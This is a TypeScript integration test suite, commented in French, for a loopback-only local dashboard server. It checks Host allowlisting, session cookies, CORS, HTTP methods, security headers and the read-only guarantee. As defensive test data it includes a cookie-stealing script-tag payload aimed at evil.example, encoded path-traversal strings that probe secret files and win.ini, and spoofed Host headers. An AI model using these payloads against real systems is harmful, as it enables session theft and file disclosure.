/**
 * IT-2A — serveur cockpit local, requêtes HTTP réelles sur un socket réel.
 *
 * Aucune requête n'est « injectée » : chaque test ouvre une connexion TCP vers
 * le port effectivement bindé. C'est la seule façon d'éprouver ce qui compte
 * ici — l'en-tête `Host` tel que Node le voit, le cookie tel que le navigateur
 * le recevrait, et l'absence d'en-tête CORS sur le fil.
 *
 * Aucun fournisseur IA n'est sollicité.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { request } from 'node:http';
import type { IncomingHttpHeaders } from 'node:http';
import { connect } from 'node:net';
import { mkdir, readFile, readdir, stat, writeFile } from 'node:fs/promises';
import path from 'node:path';

import { startCockpit } from '../../src/cockpit/cockpit-service.ts';
import type { CockpitInstance } from '../../src/cockpit/cockpit-service.ts';
import { SESSION_COOKIE_NAME } from '../../src/cockpit/session.ts';
import { encodeTimelineCursor } from '../../src/services/cockpit-read-model.ts';
import { runPaths } from '../../src/store/layout.ts';
import { lockFilePath } from '../../src/lock/run-lock.ts';
import { hostname } from 'node:os';
import type { NewCcrEvent } from '../../src/core/run.ts';
import { materializeRun, FIXTURE_TIME as T } from '../helpers/run-fixture.ts';
import { makeTempDir, removeTempDir } from '../helpers/temp-dir.ts';

interface HttpResult {
  readonly status: number;
  readonly headers: IncomingHttpHeaders;
  readonly body: string;
}

/** Un en-tête HTTP peut être multiple ; ici on veut sa forme scalaire. */
function header(result: HttpResult, name: string): string {
  const value = result.headers[name];
  return Array.isArray(value) ? value.join(', ') : (value ?? '');
}

interface RequestOptions {
  readonly method?: string;
  readonly host?: string;
  readonly cookie?: string;
  readonly headers?: Record<string, string>;
}

function http(port: number, requestPath: string, options: RequestOptions = {}): Promise<HttpResult> {
  return new Promise((resolve, reject) => {
    const headers: Record<string, string> = {
      Host: options.host ?? `127.0.0.1:${String(port)}`,
      ...options.headers,
    };
    if (options.cookie !== undefined) headers['Cookie'] = options.cookie;

    const req = request(
      { host: '127.0.0.1', port, path: requestPath, method: options.method ?? 'GET', headers },
      (res) => {
        const chunks: Buffer[] = [];
        res.on('data', (chunk: Buffer) => chunks.push(chunk));
        res.on('end', () =>
          resolve({
            status: res.statusCode ?? 0,
            headers: res.headers,
            body: Buffer.concat(chunks).toString('utf8'),
          }),
        );
      },
    );
    req.on('error', reject);
    req.end();
  });
}

/** Requête brute : seule façon d'émettre une requête *sans* en-tête `Host`. */
function raw(port: number, lines: readonly string[]): Promise<string> {
  return new Promise((resolve, reject) => {
    const socket = connect(port, '127.0.0.1', () => {
      socket.write(`${lines.join('\r\n')}\r\n\r\n`);
    });
    const chunks: Buffer[] = [];
    socket.on('data', (chunk: Buffer) => chunks.push(chunk));
    socket.on('end', () => resolve(Buffer.concat(chunks).toString('utf8')));
    socket.on('error', reject);
  });
}

/**
 * Le shell ne doit contenir aucun script ni style **en ligne**.
 *
 * Le Slice 3 sert de vrais modules : interdire toute balise `<script>` n'aurait
 * plus de sens. L'exigence réelle est plus précise — et plus forte : chaque
 * script est chargé depuis `'self'`, aucun n'a de contenu, et aucun
 * gestionnaire d'événement n'est posé en attribut. C'est exactement ce qu'une
 * CSP sans `'unsafe-inline'` autorise.
 */
function assertNoInlineCode(html: string): void {
  const chunks = html.split('<script');
  assert.ok(chunks.length > 1, 'le shell charge au moins un module');
  for (let index = 1; index < chunks.length; index += 1) {
    const chunk = chunks[index] ?? '';
    const openEnd = chunk.indexOf('>');
    assert.ok(openEnd >= 0, 'balise script bien formee');
    const attrs = chunk.slice(0, openEnd);
    const rest = chunk.slice(openEnd + 1);
    const closeAt = rest.indexOf('</script');
    assert.ok(closeAt >= 0, 'balise script fermee');
    assert.equal(rest.slice(0, closeAt).trim(), '', 'aucun script en ligne');
    assert.ok(attrs.includes('src="/assets/'), `script charge depuis self, vu : ${attrs}`);
  }
  assert.equal(html.includes('<style'), false, 'aucun style en ligne');
  assert.equal(html.includes(' style="'), false, 'aucun attribut style');
  assert.equal(/\son[a-z]+=/i.test(html), false, 'aucun gestionnaire en attribut');
  assert.equal(html.toLowerCase().includes('javascript:'), false, 'aucune URL javascript:');
}

interface Box {
  readonly instance: CockpitInstance;
  readonly port: number;
  readonly runsDir: string;
  readonly cookie: string;
  cleanup(): Promise<void>;
}

/** Démarre un cockpit réel sur un port éphémère, session déjà obtenue via `/`. */
async function open(prepare?: (runsDir: string) => Promise<void>): Promise<Box> {
  const dir = await makeTempDir('ccr-cockpit-http-');
  const runsDir = path.join(dir, 'runs');
  await mkdir(runsDir, { recursive: true });
  if (prepare !== undefined) await prepare(runsDir);

  const instance = await startCockpit({ runsDir, port: 0 });
  const port = instance.server.port;
  const bootstrap = await http(port, '/');
  const setCookie = bootstrap.headers['set-cookie']?.[0] ?? '';
  const cookie = setCookie.split(';')[0] ?? '';

  return {
    instance,
    port,
    runsDir,
    cookie,
    cleanup: async () => {
      await instance.stop();
      await removeTempDir(dir);
    },
  };
}

const RUN_CREATED: NewCcrEvent = {
  round: 0,
  actor: 'system',
  type: 'run_created',
  content: 'départ',
  timestamp: T,
};

function response(content: string, index: number): NewCcrEvent {
  return {
    round: 0,
    actor: 'codex',
    type: 'assistant_response',
    session_id: 'codex-1',
    content,
    timestamp: new Date(Date.parse(T) + index * 1000).toISOString(),
  };
}

// --------------------------------------------------------------------------
// (1-7) Écoute, Host
// --------------------------------------------------------------------------

test('(H1) le serveur n’écoute que sur 127.0.0.1', async (t) => {
  const b = await open();
  try {
    t.diagnostic(`adresse=${b.instance.server.address} port=${String(b.port)}`);
    assert.equal(b.instance.server.address, '127.0.0.1');
    assert.notEqual(b.instance.server.address, '0.0.0.0');
    assert.notEqual(b.instance.server.address, '::');
    assert.equal(b.instance.server.url, `http://127.0.0.1:${String(b.port)}/`);
  } finally {
    await b.cleanup();
  }
});

test('(H2) Host : seule l’autorité canonique est acceptée', async () => {
  const b = await open();
  try {
    assert.equal((await http(b.port, '/', { host: `127.0.0.1:${String(b.port)}` })).status, 200);

    // `localhost` résout vers 127.0.0.1 mais n'est pas l'autorité bindée :
    // c'est exactement le vecteur du DNS rebinding.
    for (const host of [
      `localhost:${String(b.port)}`,
      `evil.example:${String(b.port)}`,
      `127.0.0.1:${String(b.port + 1)}`,
      '127.0.0.1',
      `[::1]:${String(b.port)}`,
      `127.0.0.1:${String(b.port)}.evil.example`,
    ]) {
      const result = await http(b.port, '/', { host });
      assert.equal(result.status, 403, `Host « ${host} » doit être refusé`);
      assert.equal(JSON.parse(result.body).error.code, 'INVALID_HOST');
      assert.equal(result.headers['set-cookie'], undefined, 'aucun cookie posé à une origine refusée');
    }
  } finally {
    await b.cleanup();
  }
});

test('(H3) Host absent : refusé, même sur une connexion loopback réelle', async () => {
  const b = await open();
  try {
    // Sans `Host`, l'analyseur HTTP/1.1 de Node refuse avant même que la
    // requête n'atteigne l'application : le refus est plus précoce, pas plus
    // faible. Aucun contenu CCR n'est servi.
    const absent = await raw(b.port, ['GET / HTTP/1.1', 'Connection: close']);
    assert.match(absent, /^HTTP\/1\.1 400 /);
    assert.equal(absent.includes('Set-Cookie'), false);

    // Un `Host` vide franchit l'analyseur : c'est notre allowlist qui le
    // refuse, et c'est cette couche-là qu'il faut prouver.
    const empty = await raw(b.port, ['GET / HTTP/1.1', 'Host:', 'Connection: close']);
    assert.match(empty, /^HTTP\/1\.1 403 /);
    assert.match(empty, /INVALID_HOST/);
    assert.equal(empty.includes('Set-Cookie'), false);
  } finally {
    await b.cleanup();
  }
});

test('(H4) X-Forwarded-Host ne rachète pas un Host refusé', async () => {
  const b = await open();
  try {
    const result = await http(b.port, '/', {
      host: 'evil.example',
      headers: { 'X-Forwarded-Host': `127.0.0.1:${String(b.port)}` },
    });
    // Il n'existe aucun reverse proxy dans le produit : cet en-tête n'est
    // jamais lu, et ne peut donc rien réparer.
    assert.equal(result.status, 403);
  } finally {
    await b.cleanup();
  }
});

// --------------------------------------------------------------------------
// (8-16) Session
// --------------------------------------------------------------------------

test('(H5) « / » pose la session, avec les bons attributs et aucun contenu CCR', async () => {
  const b = await open(async (runsDir) => {
    await materializeRun(runsDir, { runId: 'CCR-20260402-001', events: [RUN_CREATED] });
  });
  try {
    const result = await http(b.port, '/');
    const setCookie = result.headers['set-cookie']?.[0] ?? '';

    assert.equal(result.status, 200);
    assert.match(header(result, 'content-type'), /^text\/html/);
    assert.ok(setCookie.startsWith(`${SESSION_COOKIE_NAME}=`));
    assert.match(setCookie, /HttpOnly/);
    assert.match(setCookie, /SameSite=Strict/);
    assert.match(setCookie, /Path=\//);
    assert.equal(/Domain=/i.test(setCookie), false);
    assert.equal(/Secure/i.test(setCookie), false);

    // Bootstrap, pas frontend : aucun script, aucune donnée de run.
    assert.equal(b.instance.server.sessionSecret.length > 0, true);
    assert.equal(result.body.includes(b.instance.server.sessionSecret), false, 'le secret n’est pas dans le corps');
    assert.equal(result.body.includes('CCR-20260402-001'), false, 'aucune donnée de run dans le shell');
    assert.equal(result.body.includes('Titre CCR'), false);
    assertNoInlineCode(result.body);
    assert.match(result.body, /CCR — Local Cockpit/);
  } finally {
    await b.cleanup();
  }
});

test('(H6) l’API exige la session : 401 sans cookie, 401 avec un mauvais', async () => {
  const b = await open();
  try {
    const anonymous = await http(b.port, '/api/runs');
    assert.equal(anonymous.status, 401);
    assert.equal(JSON.parse(anonymous.body).error.code, 'UNAUTHENTICATED');

    const wrong = await http(b.port, '/api/runs', {
      cookie: `${SESSION_COOKIE_NAME}=pas-le-bon-secret-du-tout`,
    });
    assert.equal(wrong.status, 401);

    const good = await http(b.port, '/api/runs', { cookie: b.cookie });
    assert.equal(good.status, 200);
  } finally {
    await b.cleanup();
  }
});

test('(H7) redémarrage : le secret est renouvelé, l’ancien cookie ne vaut plus rien', async () => {
  const dir = await makeTempDir('ccr-cockpit-restart-');
  try {
    const runsDir = path.join(dir, 'runs');
    await mkdir(runsDir, { recursive: true });

    const first = await startCockpit({ runsDir, port: 0 });
    let oldCookie: string;
    let oldSecret: string;
    try {
      const bootstrap = await http(first.server.port, '/');
      oldCookie = (bootstrap.headers['set-cookie']?.[0] ?? '').split(';')[0] ?? '';
      oldSecret = first.server.sessionSecret;
      assert.equal((await http(first.server.port, '/api/runs', { cookie: oldCookie })).status, 200);
    } finally {
      // Sans ce `finally`, un échec ici laisserait le socket ouvert et le
      // processus de test ne se terminerait jamais.
      await first.stop();
    }

    const second = await startCockpit({ runsDir, port: 0 });
    try {
      assert.notEqual(second.server.sessionSecret, oldSecret, 'secret régénéré');
      const replayed = await http(second.server.port, '/api/runs', { cookie: oldCookie });
      assert.equal(replayed.status, 401, 'un cookie d’une instance morte n’authentifie rien');
    } finally {
      await second.stop();
    }
  } finally {
    await removeTempDir(dir);
  }
});

test('(H8) aucun en-tête CORS, et OPTIONS n’en fabrique pas', async () => {
  const b = await open();
  try {
    const probes = [
      await http(b.port, '/'),
      await http(b.port, '/api/runs', { cookie: b.cookie }),
      await http(b.port, '/api/runs', { cookie: b.cookie, headers: { Origin: 'https://evil.example' } }),
      await http(b.port, '/api/runs', { method: 'OPTIONS', cookie: b.cookie }),
    ];

    for (const probe of probes) {
      for (const header of Object.keys(probe.headers)) {
        assert.equal(
          header.toLowerCase().startsWith('access-control-'),
          false,
          `en-tête CORS inattendu : ${header}`,
        );
      }
      assert.equal(probe.headers['vary'], undefined, 'aucun Vary: Origin');
    }

    const options = probes[3];
    assert.equal(options?.status, 405);
    assert.equal(options?.headers['allow'], 'GET, HEAD, POST');
  } finally {
    await b.cleanup();
  }
});

// --------------------------------------------------------------------------
// (17-20) Méthodes, en-têtes de sécurité
// --------------------------------------------------------------------------

test('(H9) méthodes : seules GET, HEAD et POST existent — et POST exige son origine', async () => {
  const b = await open();
  try {
    // Le Slice 4 ouvre `POST`, et lui seul. Les autres verbes n'existent pas.
    for (const method of ['PUT', 'PATCH', 'DELETE']) {
      for (const target of ['/api/runs', '/api/runs/CCR-20260402-001/pause', '/']) {
        const result = await http(b.port, target, { method, cookie: b.cookie });
        assert.equal(result.status, 405, `${method} ${target}`);
        assert.equal(JSON.parse(result.body).error.code, 'METHOD_NOT_ALLOWED');
        assert.equal(result.headers['allow'], 'GET, HEAD, POST');
      }
    }

    // Sans session, un `POST` est refusé avant même la question de l'origine.
    assert.equal((await http(b.port, '/api/runs/CCR-20260402-001/pause', { method: 'POST' })).status, 401);

    // Un `POST` sans origine canonique est refusé **avant tout routage** :
    // ni la route, ni le corps ne sont examinés — pas même sur « / ».
    for (const target of ['/api/runs/CCR-20260402-001/pause', '/api/runs', '/']) {
      const result = await http(b.port, target, { method: 'POST', cookie: b.cookie });
      assert.equal(result.status, 403, target);
      assert.equal(JSON.parse(result.body).error.code, 'INVALID_ORIGIN');
    }

    // Avec l'origine canonique, seules les routes de mutation existent.
    const origin = `http://127.0.0.1:${String(b.port)}`;
    // Le Slice 6 ouvre la **collection** : `POST /api/runs` crée un run. Elle
    // existe donc désormais, et se reconnaît à ce qu'elle exige un média — la
    // preuve qu'elle a été routée, et non refusée comme inconnue.
    const collection = await http(b.port, '/api/runs', {
      method: 'POST',
      cookie: b.cookie,
      headers: { Origin: origin },
    });
    assert.equal(collection.status, 415, 'POST /api/runs est routée');
    assert.equal(JSON.parse(collection.body).error.code, 'UNSUPPORTED_MEDIA_TYPE');

    // Ce qui reste hors périmètre le reste vraiment — y compris tout alias de
    // création, que la route de collection rend justement inutile.
    for (const target of [
      '/',
      '/api/start',
      '/api/runs/start',
      '/api/runs/CCR-20260402-001/start',
      '/api/runs/CCR-20260402-001/recover',
      '/api/runs/CCR-20260402-001/handoff',
    ]) {
      const result = await http(b.port, target, { method: 'POST', cookie: b.cookie, headers: { Origin: origin } });
      assert.equal(result.status, 404, target);
    }
  } finally {
    await b.cleanup();
  }
});

test('(H10) HEAD : mêmes statut et en-têtes que GET, corps vide', async () => {
  const b = await open(async (runsDir) => {
    await materializeRun(runsDir, { runId: 'CCR-20260402-001', events: [RUN_CREATED] });
  });
  try {
    const get = await http(b.port, '/api/runs', { cookie: b.cookie });
    const head = await http(b.port, '/api/runs', { method: 'HEAD', cookie: b.cookie });

    assert.equal(head.status, get.status);
    assert.equal(head.headers['content-type'], get.headers['content-type']);
    assert.equal(head.headers['content-length'], get.headers['content-length']);
    assert.equal(head.headers['cache-control'], get.headers['cache-control']);
    assert.equal(head.body, '', 'corps vide');
    assert.notEqual(get.body, '');

    // L'authentification s'applique aussi à HEAD.
    assert.equal((await http(b.port, '/api/runs', { method: 'HEAD' })).status, 401);
  } finally {
    await b.cleanup();
  }
});

test('(H11) en-têtes de sécurité sur toutes les réponses', async () => {
  const b = await open();
  try {
    for (const probe of [
      await http(b.port, '/'),
      await http(b.port, '/api/runs', { cookie: b.cookie }),
      await http(b.port, '/api/inconnu', { cookie: b.cookie }),
      await http(b.port, '/api/runs', { host: 'evil.example' }),
    ]) {
      assert.equal(probe.headers['cache-control'], 'no-store');
      assert.equal(probe.headers['x-content-type-options'], 'nosniff');
      assert.equal(probe.headers['referrer-policy'], 'no-referrer');
      assert.equal(probe.headers['x-frame-options'], 'DENY');
      const csp = header(probe, 'content-security-policy');
      assert.match(csp, /default-src 'none'/);
      assert.match(csp, /base-uri 'none'/);
      assert.match(csp, /frame-ancestors 'none'/);
      assert.match(csp, /form-action 'none'/);
    }
  } finally {
    await b.cleanup();
  }
});

// --------------------------------------------------------------------------
// (21-31) Routes
// --------------------------------------------------------------------------

test('(H12) /api/runs : liste vide, puis plusieurs runs, puis un run illisible', async () => {
  const empty = await open();
  try {
    const result = await http(empty.port, '/api/runs', { cookie: empty.cookie });
    assert.equal(result.status, 200);
    assert.match(header(result, 'content-type'), /^application\/json/);
    assert.deepEqual(JSON.parse(result.body), { runs: [] });
  } finally {
    await empty.cleanup();
  }

  const b = await open(async (runsDir) => {
    await materializeRun(runsDir, { runId: 'CCR-20260402-001', events: [RUN_CREATED] });
    await materializeRun(runsDir, { runId: 'CCR-20260808-002', state: { state: 'PAUSED', control: 'HUMAN' } });
    // Corruption stable et isolée : elle ne doit pas emporter la liste.
    await materializeRun(runsDir, { runId: 'CCR-20260808-003', rawManifest: '{ cassé' });
  });
  try {
    const result = await http(b.port, '/api/runs', { cookie: b.cookie });
    const runs = JSON.parse(result.body).runs as { run_id: string; unreadable: boolean }[];

    assert.equal(result.status, 200, 'un run illisible ne devient pas une erreur globale');
    assert.equal(runs.length, 3);
    assert.deepEqual(
      runs.map((r) => r.run_id),
      ['CCR-20260402-001', 'CCR-20260808-002', 'CCR-20260808-003'],
    );
    const broken = runs.find((r) => r.run_id === 'CCR-20260808-003');
    assert.equal(broken?.unreadable, true, 'représenté selon le contrat Slice 1');
    assert.equal(runs.filter((r) => r.unreadable).length, 1, 'la corruption reste isolée');
  } finally {
    await b.cleanup();
  }
});

test('(H13) /api/runs/:id : vue complète, révision unique, sans seconde révision HTTP', async () => {
  const b = await open(async (runsDir) => {
    await materializeRun(runsDir, { runId: 'CCR-20260402-001', events: [RUN_CREATED, response('bonjour', 1)] });
  });
  try {
    const result = await http(b.port, '/api/runs/CCR-20260402-001', { cookie: b.cookie });
    const view = JSON.parse(result.body) as Record<string, unknown>;

    assert.equal(result.status, 200);
    assert.match(String(view['revision']), /^sha256:[0-9a-f]{64}$/);
    assert.equal((view['identity'] as { run_id: string }).run_id, 'CCR-20260402-001');
    // Aucune révision fabriquée par le transport : ni ETag, ni champ parallèle.
    assert.equal(result.headers['etag'], undefined);
    assert.equal(Object.keys(view).filter((k) => k.includes('revision')).length, 1);
  } finally {
    await b.cleanup();
  }
});

test('(H14) timeline : première page, curseur, et curseur périmé → 409', async () => {
  const b = await open(async (runsDir) => {
    await materializeRun(runsDir, {
      runId: 'CCR-20260402-001',
      events: [RUN_CREATED, ...Array.from({ length: 9 }, (_, i) => response(`m${String(i)}`, i + 1))],
    });
  });
  try {
    const first = await http(b.port, '/api/runs/CCR-20260402-001/timeline?limit=4', { cookie: b.cookie });
    const page = JSON.parse(first.body) as { entries: unknown[]; cursor_next: string | null };

    assert.equal(first.status, 200);
    assert.equal(page.entries.length, 4);
    assert.equal(typeof page.cursor_next, 'string');

    const second = await http(
      b.port,
      `/api/runs/CCR-20260402-001/timeline?limit=4&cursor=${encodeURIComponent(page.cursor_next ?? '')}`,
      { cookie: b.cookie },
    );
    assert.equal(second.status, 200);
    assert.equal((JSON.parse(second.body) as { entries: unknown[] }).entries.length, 4);

    // Curseur émis pour une autre révision : refusé, jamais rafistolé.
    const stale = encodeTimelineCursor(`sha256:${'0'.repeat(64)}`, 4);
    const rejected = await http(
      b.port,
      `/api/runs/CCR-20260402-001/timeline?cursor=${encodeURIComponent(stale)}`,
      { cookie: b.cookie },
    );
    assert.equal(rejected.status, 409);
    assert.equal(JSON.parse(rejected.body).error.code, 'STALE_REVISION');
  } finally {
    await b.cleanup();
  }
});

test('(H15) timeline : validation stricte des paramètres', async () => {
  const b = await open(async (runsDir) => {
    await materializeRun(runsDir, { runId: 'CCR-20260402-001', events: [RUN_CREATED] });
  });
  try {
    const base = '/api/runs/CCR-20260402-001/timeline';
    for (const query of [
      '?cursor=a&cursor=b', // deux curseurs
      '?limit=0',
      '?limit=1001',
      '?limit=-1',
      '?limit=abc',
      '?limit=1&limit=2',
      '?inconnu=1', // politique stricte
      `?cursor=${'x'.repeat(600)}`,
    ]) {
      const result = await http(b.port, `${base}${query}`, { cookie: b.cookie });
      assert.equal(result.status, 400, `« ${query} » doit être refusé`);
      assert.equal(JSON.parse(result.body).error.code, 'INVALID_ARGUMENT');
    }

    // Les routes sans paramètre déclaré refusent aussi toute query.
    assert.equal((await http(b.port, '/api/runs?x=1', { cookie: b.cookie })).status, 400);
    assert.equal((await http(b.port, '/api/runs/CCR-20260402-001?x=1', { cookie: b.cookie })).status, 400);
  } finally {
    await b.cleanup();
  }
});

test('(H16) recovery : la levée est annoncée avec son jeton, et la vue n’exécute rien', async (t) => {
  const STALE_PID = 999_997;
  const b = await open(async (runsDir) => {
    await materializeRun(runsDir, {
      runId: 'CCR-20260402-001',
      state: { state: 'RECOVERY_REQUIRED', control: 'HUMAN' },
      events: [RUN_CREATED],
    });
    // Verrou de run dont le propriétaire a disparu : c'est la seule situation
    // où la levée d'un verrou périmé aurait un sens.
    await writeFile(
      lockFilePath(runPaths(runsDir, 'CCR-20260402-001')),
      JSON.stringify({
        lock_id: 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee',
        pid: STALE_PID,
        hostname: hostname(),
        started_at: T,
        command: 'step',
      }),
      'utf8',
    );
  });
  try {
    const runRoot = runPaths(b.runsDir, 'CCR-20260402-001');
    const stateBefore = await readFile(runRoot.state, 'utf8');
    const lockBefore = await readFile(lockFilePath(runRoot), 'utf8');

    const result = await http(b.port, '/api/runs/CCR-20260402-001/recovery', { cookie: b.cookie });
    const view = JSON.parse(result.body) as {
      missing_primitives: { id: string; reason: string }[];
      capabilities: { id: string; invocation: { observed_lock_token?: string } }[];
      known_facts: { lock_observation: string };
    };

    assert.equal(result.status, 200);
    t.diagnostic(`verrou observé : ${view.known_facts.lock_observation}`);

    // 1. plus rien ne manque
    assert.deepEqual(view.missing_primitives, [], 'la primitive existe désormais');

    // 2. exposée comme action sélectionnable, jeton compris
    const clear = view.capabilities.find((c) => c.id === 'RECOVERY_CLEAR_STALE_LOCK');
    assert.ok(clear !== undefined, 'la levée est annoncée');
    assert.match(clear?.invocation.observed_lock_token ?? '', /^lt1:[A-Za-z0-9_-]{43}$/);

    // 3. jamais exécutée : consulter la vue ne répare rien et ne lève rien
    assert.equal(await readFile(runRoot.state, 'utf8'), stateBefore, 'état canonique intact');
    assert.equal(await readFile(lockFilePath(runRoot), 'utf8'), lockBefore, 'verrou périmé intact');
  } finally {
    await b.cleanup();
  }
});

test('(H17) /api/config : projection sûre, sans environnement brut ni secret', async () => {
  const b = await open();
  try {
    const result = await http(b.port, '/api/config', { cookie: b.cookie });
    const config = JSON.parse(result.body) as Record<string, unknown>;

    assert.equal(result.status, 200);
    assert.deepEqual(Object.keys(config).sort(), [
      'codex',
      'config_origin',
      'config_path',
      'legacy_env',
      'node_version',
      'preflight',
    ]);
    const serialized = JSON.stringify(config);
    assert.equal(serialized.includes(b.instance.server.sessionSecret), false);
    for (const variable of ['PATH', 'USERPROFILE', 'HOME', 'TOKEN', 'KEY', 'SECRET']) {
      assert.equal(serialized.includes(`"${variable}"`), false, `pas de ${variable} brut`);
    }
  } finally {
    await b.cleanup();
  }
});

test('(H18) /api/doctor : constats rendus, sans pid ni nom d’hôte', async () => {
  const b = await open();
  try {
    const result = await http(b.port, '/api/doctor', { cookie: b.cookie });
    const report = JSON.parse(result.body) as { status: string; configLock: Record<string, unknown> };

    assert.equal(result.status, 200);
    assert.ok(['READY', 'ATTENTION', 'BLOCKED'].includes(report.status));
    // §24.2 : ni PID ni nom d'hôte ne franchissent la frontière HTTP.
    assert.equal('pid' in report.configLock, false);
    assert.equal('hostname' in report.configLock, false);
  } finally {
    await b.cleanup();
  }
});

// --------------------------------------------------------------------------
// (32-36) Identifiants, traversal, immuabilité
// --------------------------------------------------------------------------

test('(H19) run absent → 404 ; identifiant non canonique → 400', async () => {
  const b = await open();
  try {
    const absent = await http(b.port, '/api/runs/CCR-20260808-999', { cookie: b.cookie });
    assert.equal(absent.status, 404);
    assert.equal(JSON.parse(absent.body).error.code, 'RUN_NOT_FOUND');

    for (const malformed of ['run-1', 'CCR-2026-001', 'CCR-20260808-1', 'CCR-20260808-0001', '%20']) {
      const result = await http(b.port, `/api/runs/${malformed}`, { cookie: b.cookie });
      assert.equal(result.status, 400, `« ${malformed} » doit être refusé avant toute lecture`);
      assert.equal(JSON.parse(result.body).error.code, 'INVALID_ARGUMENT');
    }
  } finally {
    await b.cleanup();
  }
});

test('(H20) traversal : simple, encodé, doublement encodé, séparateurs, NUL', async () => {
  const secret = 'CE-FICHIER-NE-DOIT-JAMAIS-ETRE-SERVI';
  const b = await open(async (runsDir) => {
    await writeFile(path.join(runsDir, '..', 'secret.txt'), secret, 'utf8');
    await materializeRun(runsDir, { runId: 'CCR-20260402-001', events: [RUN_CREATED] });
  });
  try {
    const attempts = [
      '/api/runs/../../secret.txt',
      '/api/runs/%2e%2e/secret.txt',
      '/api/runs/%2e%2e%2f%2e%2e%2fsecret.txt',
      '/api/runs/%252e%252e/secret.txt',
      '/api/runs/..%2f..%2fsecret.txt',
      '/api/runs/..%5c..%5csecret.txt',
      '/api/runs/CCR-20260402-001%00.txt',
      '/api/runs/%00',
      '/api/runs/C:%5cWindows%5cwin.ini',
      '/api/runs/CCR-20260402-001/../../secret.txt',
    ];

    for (const attempt of attempts) {
      const result = await http(b.port, attempt, { cookie: b.cookie });
      assert.ok(
        [400, 404].includes(result.status),
        `« ${attempt} » doit être refusé (reçu ${String(result.status)})`,
      );
      assert.equal(result.body.includes(secret), false, `« ${attempt} » ne doit rien divulguer`);
      assert.match(header(result, 'content-type'), /^application\/json/);
    }
  } finally {
    await b.cleanup();
  }
});

test('(H21) corruption stable → 422, distincte d’une indisponibilité transitoire', async () => {
  const b = await open(async (runsDir) => {
    await materializeRun(runsDir, { runId: 'CCR-20260402-001', rawManifest: '{ manifeste cassé' });
    await materializeRun(runsDir, {
      runId: 'CCR-20260808-002',
      events: [RUN_CREATED],
      rawEvents: '{"pas":"un événement valide"}\n',
    });
  });
  try {
    const broken = await http(b.port, '/api/runs/CCR-20260402-001', { cookie: b.cookie });
    assert.equal(broken.status, 422, 'une corruption stable ne se répare pas par un réessai');
    assert.equal(JSON.parse(broken.body).error.code, 'MANIFEST_INVALID');

    const journal = await http(b.port, '/api/runs/CCR-20260808-002/timeline', { cookie: b.cookie });
    assert.equal(journal.status, 422);
    assert.equal(JSON.parse(journal.body).error.code, 'JOURNAL_INVALID');
    // Aucun extrait de la ligne corrompue ne franchit la frontière.
    assert.equal(journal.body.includes('MARQUEUR_LIGNE_CORROMPUE'), false);
    assert.equal(journal.body.includes('xyzzy'), false);
  } finally {
    await b.cleanup();
  }
});

test('(H22) contenu hostile : servi comme donnée JSON, jamais interpolé dans « / »', async () => {
  const payload = '<script>fetch("http://evil.example?c="+document.cookie)</script>';
  const b = await open(async (runsDir) => {
    await materializeRun(runsDir, {
      runId: 'CCR-20260402-001',
      events: [RUN_CREATED, response(payload, 1)],
    });
  });
  try {
    const timeline = await http(b.port, '/api/runs/CCR-20260402-001/timeline', { cookie: b.cookie });
    assert.equal(timeline.status, 200);
    assert.match(header(timeline, 'content-type'), /^application\/json/);
    // Présent comme donnée, et re-parsable : ce n'est pas du HTML.
    const page = JSON.parse(timeline.body) as { entries: { content?: string }[] };
    assert.ok(page.entries.some((e) => e.content === payload));

    const bootstrap = await http(b.port, '/');
    assert.equal(bootstrap.body.includes('evil.example'), false);
    assert.equal(bootstrap.body.includes(payload), false, 'le payload n’atteint jamais le shell');
    assert.equal(bootstrap.body.includes('CCR-20260402-001'), false);
    assertNoInlineCode(bootstrap.body);
  } finally {
    await b.cleanup();
  }
});

test('(H23) aucune lecture ne modifie un fichier canonique', async () => {
  const b = await open(async (runsDir) => {
    await materializeRun(runsDir, {
      runId: 'CCR-20260402-001',
      state: { state: 'RECOVERY_REQUIRED', control: 'HUMAN' },
      events: [RUN_CREATED, response('a', 1)],
      decisions: [{ content: 'décision humaine', timestamp: T }],
    });
  });
  try {
    const paths = runPaths(b.runsDir, 'CCR-20260402-001');
    const files = [paths.manifest, paths.state, paths.events, paths.decisions];
    const before = await Promise.all(
      files.map(async (file) => {
        const info = await stat(file);
        return `${String(info.size)}|${String(info.mtimeMs)}|${await readFile(file, 'utf8')}`;
      }),
    );

    for (const target of [
      '/api/runs',
      '/api/runs/CCR-20260402-001',
      '/api/runs/CCR-20260402-001/timeline',
      '/api/runs/CCR-20260402-001/recovery',
      '/api/config',
      '/api/doctor',
    ]) {
      assert.equal((await http(b.port, target, { cookie: b.cookie })).status, 200, target);
    }

    const after = await Promise.all(
      files.map(async (file) => {
        const info = await stat(file);
        return `${String(info.size)}|${String(info.mtimeMs)}|${await readFile(file, 'utf8')}`;
      }),
    );
    assert.deepEqual(after, before, 'le serveur est en lecture seule, y compris sur les verrous');

    // Et aucun verrou de run n'a été créé au passage.
    const entries = await readdir(paths.root);
    assert.equal(entries.includes('.ccr.lock'), false);
  } finally {
    await b.cleanup();
  }
});

test('(H24) route inconnue → 404, sans révéler la surface', async () => {
  const b = await open();
  try {
    for (const target of ['/api', '/api/', '/api/inconnu', '/api/runs/CCR-20260402-001/inconnu', '/favicon.ico', '/index.html']) {
      const result = await http(b.port, target, { cookie: b.cookie });
      assert.equal(result.status, 404, target);
    }
    // `/api/stream` et `/api/runs/:id/stream` existent depuis le Slice 8. Elles
    // ne sont pas interrogées ici : une réponse `text/event-stream` ne se
    // termine pas, et ce harnais attend la fin. Leur surface est éprouvée par
    // `tests/integration/cockpit-invalidation.test.ts`.
    // `/api/operations/:id` existe depuis le Slice 4 : un identifiant mal formé
    // est refusé avant toute lecture, un identifiant valide mais inconnu est
    // introuvable.
    assert.equal((await http(b.port, '/api/operations/abc', { cookie: b.cookie })).status, 400);
    const unknown = await http(b.port, `/api/operations/op_${'0'.repeat(64)}`, { cookie: b.cookie });
    assert.equal(unknown.status, 404);
    assert.equal(JSON.parse(unknown.body).error.code, 'OPERATION_NOT_FOUND');
  } finally {
    await b.cleanup();
  }
});

test('(H25) requête démesurée : refusée sans allocation proportionnelle', async () => {
  const b = await open();
  try {
    const result = await http(b.port, `/api/runs?x=${'a'.repeat(5000)}`, { cookie: b.cookie });
    assert.equal(result.status, 400);
    assert.equal(JSON.parse(result.body).error.code, 'INVALID_ARGUMENT');
  } finally {
    await b.cleanup();
  }
});
